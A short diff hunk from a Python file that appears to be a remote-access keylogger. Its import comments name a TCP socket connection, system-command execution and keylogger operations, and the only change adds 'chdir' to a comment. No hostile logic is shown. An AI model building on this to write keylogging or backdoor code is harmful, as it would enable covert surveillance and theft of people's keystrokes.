@@ -10,7 +10,7 @@ MODULE NAME: ______
 try:
 	import socket # Import socket for creating TCP connection.
 	from subprocess import PIPE, run # Import subprocess to execute system commands.
-	import os # Import os for devnull, remove, mkdir
+	import os # Import os for devnull, remove, mkdir, chdir
 	from sys import exit # Import exit from sys to quit program when specified.
 	from platform import system # Import system from platform to detect os.
 	from pynput import keyboard # Import keyboard to perform keylogger operations.
